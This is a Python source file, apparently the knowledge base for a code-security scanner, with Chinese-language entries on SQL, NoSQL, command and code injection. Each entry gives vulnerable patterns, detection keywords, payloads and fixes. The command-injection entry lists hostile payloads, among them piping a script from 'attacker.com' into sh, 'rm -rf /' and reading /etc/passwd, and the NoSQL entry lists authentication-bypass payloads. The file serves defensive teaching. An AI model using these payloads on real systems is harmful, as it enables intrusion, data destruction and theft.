"""
注入类漏洞知识
"""

from ..base import KnowledgeDocument, KnowledgeCategory


SQL_INJECTION = KnowledgeDocument(
    id="vuln_sql_injection",
    title="SQL Injection",
    category=KnowledgeCategory.VULNERABILITY,
    tags=["sql", "injection", "database", "input-validation", "sqli"],
    severity="critical",
    cwe_ids=["CWE-89"],
    owasp_ids=["A03:2021"],
    content="""
SQL注入是一种代码注入技术，攻击者通过在应用程序查询中插入恶意SQL代码来操纵数据库。

## 危险模式

### Python
```python
# 危险 - 字符串拼接
query = "SELECT * FROM users WHERE id = " + user_id
cursor.execute(f"SELECT * FROM users WHERE name = '{name}'")
query = "SELECT * FROM users WHERE id = %s" % user_id

# 危险 - ORM原始查询
User.objects.raw(f"SELECT * FROM users WHERE name = '{name}'")
db.execute(text(f"SELECT * FROM users WHERE id = {user_id}"))
```

### JavaScript/Node.js
```javascript
// 危险
const query = `SELECT * FROM users WHERE id = ${userId}`;
connection.query("SELECT * FROM users WHERE name = '" + name + "'");
```

### Java
```java
// 危险
String query = "SELECT * FROM users WHERE id = " + userId;
Statement stmt = conn.createStatement();
stmt.executeQuery(query);
```

### PHP
```php
// 危险 - 字符串拼接
$sql = "SELECT * FROM users WHERE id = " . $_GET['id'];
mysqli_query($conn, "SELECT * FROM users WHERE name = '" . $_POST['name'] . "'");
mysql_query("SELECT * FROM users WHERE id = $id");

// 危险 - PDO/ORM 原始查询拼接
$stmt = $pdo->query("SELECT * FROM users WHERE id = " . $id);
$rows = DB::select("SELECT * FROM users WHERE id = " . $id);   // Laravel
```

## 检测关键词
- execute, query, raw, cursor
- SELECT, INSERT, UPDATE, DELETE
- 字符串拼接 (+, f-string, format, %)
- WHERE, AND, OR 后跟变量

## 安全实践
1. 使用参数化查询/预编译语句
2. 使用ORM框架的安全API
3. 输入验证和类型检查
4. 最小权限原则
5. 使用存储过程

## 修复示例
```python
# 安全 - 参数化查询
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))

# 安全 - ORM
User.objects.filter(id=user_id)

# 安全 - SQLAlchemy
db.query(User).filter(User.id == user_id)
```

### PHP
```php
// 安全 - PDO 预处理
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$_GET['id']]);

// 安全 - mysqli 预处理
$stmt = $conn->prepare("SELECT * FROM users WHERE id = ?");
$stmt->bind_param("i", $userId);
$stmt->execute();

// 安全 - Laravel 查询构造器/ORM
$user = DB::table('users')->where('id', $id)->first();
$user = User::find($id);
```

## 验证方法
1. 尝试单引号 ' 触发语法错误
2. 使用 OR 1=1 测试布尔注入
3. 使用 SLEEP() 测试时间盲注
4. 检查错误信息是否泄露数据库信息
""",
)


NOSQL_INJECTION = KnowledgeDocument(
    id="vuln_nosql_injection",
    title="NoSQL Injection",
    category=KnowledgeCategory.VULNERABILITY,
    tags=["nosql", "mongodb", "injection", "database"],
    severity="high",
    cwe_ids=["CWE-943"],
    owasp_ids=["A03:2021"],
    content="""
NoSQL注入针对MongoDB等NoSQL数据库，通过操纵查询对象来绕过认证或提取数据。

## 危险模式

### MongoDB (Python)
```python
# 危险 - 直接使用用户输入构建查询
db.users.find({"username": username, "password": password})
# 攻击者可传入 {"$ne": ""} 绕过认证

# 危险 - $where操作符
db.users.find({"$where": f"this.name == '{name}'"})
```

### MongoDB (Node.js)
```javascript
// 危险
db.collection('users').find({username: req.body.username});
// 攻击者可传入 {$gt: ""} 或 {$ne: null}
```

## 攻击载荷示例
```json
// 绕过认证
{"username": {"$ne": ""}, "password": {"$ne": ""}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}

// 正则注入
{"username": {"$regex": "^admin"}}
```

## 安全实践
1. 验证输入类型（确保是字符串而非对象）
2. 使用白名单验证
3. 避免使用$where操作符
4. 使用mongoose等ODM的类型验证

## 修复示例
```python
# 安全 - 类型验证
if not isinstance(username, str):
    raise ValueError("Invalid username type")
db.users.find({"username": str(username)})
```
""",
)


COMMAND_INJECTION = KnowledgeDocument(
    id="vuln_command_injection",
    title="Command Injection",
    category=KnowledgeCategory.VULNERABILITY,
    tags=["command", "injection", "shell", "os", "system", "rce"],
    severity="critical",
    cwe_ids=["CWE-78"],
    owasp_ids=["A03:2021"],
    content="""
命令注入允许攻击者在主机操作系统上执行任意命令，可能导致完全系统控制。

## 危险模式

### Python
```python
# 危险
os.system("ping " + user_input)
os.popen("ls " + directory)
subprocess.call("ls " + directory, shell=True)
subprocess.Popen(cmd, shell=True)
commands.getoutput("cat " + filename)

# 危险 - eval/exec
eval(user_input)
exec(user_code)
```

### Node.js
```javascript
// 危险
exec("ls " + userInput);
execSync(`cat ${filename}`);
spawn("sh", ["-c", userCommand]);
```

### PHP
```php
// 危险
system("ping " . $ip);
exec("cat " . $file);
shell_exec($cmd);
passthru($command);
```

## 攻击载荷
```bash
; ls -la
| cat /etc/passwd
`whoami`
$(id)
&& rm -rf /
|| curl attacker.com/shell.sh | sh
```

## 安全实践
1. 避免使用shell=True
2. 使用参数列表而非字符串
3. 输入验证和白名单
4. 使用安全的替代API
5. 沙箱执行

## 修复示例
```python
# 安全 - 参数列表
subprocess.run(["ping", "-c", "4", validated_host], shell=False)

# 安全 - shlex转义
import shlex
subprocess.run(shlex.split(f"ping -c 4 {shlex.quote(host)}"))
```
""",
)


CODE_INJECTION = KnowledgeDocument(
    id="vuln_code_injection",
    title="Code Injection",
    category=KnowledgeCategory.VULNERABILITY,
    tags=["code", "injection", "eval", "exec", "rce"],
    severity="critical",
    cwe_ids=["CWE-94"],
    owasp_ids=["A03:2021"],
    content="""
代码注入允许攻击者注入并执行任意代码，通常通过eval()等动态执行函数。

## 危险模式

### Python
```python
# 危险
eval(user_input)
exec(user_code)
compile(user_code, '<string>', 'exec')

# 危险 - 模板注入
template = Template(user_input)
render_template_string(user_input)
```

### JavaScript
```javascript
// 危险
eval(userInput);
new Function(userCode)();
setTimeout(userCode, 1000);
setInterval(userCode, 1000);
```

### PHP
```php
// 危险
eval($code);
assert($code);
preg_replace('/e', $code, $input);  // PHP < 7
create_function('', $code);
```

## 安全实践
1. 永远不要eval用户输入
2. 使用AST解析代替eval
3. 使用沙箱环境
4. 白名单允许的操作

## 修复示例
```python
# 安全 - 使用ast.literal_eval处理数据
import ast
data = ast.literal_eval(user_input)  # 只允许字面量

# 安全 - 使用json解析
import json
data = json.loads(user_input)
```
""",
)
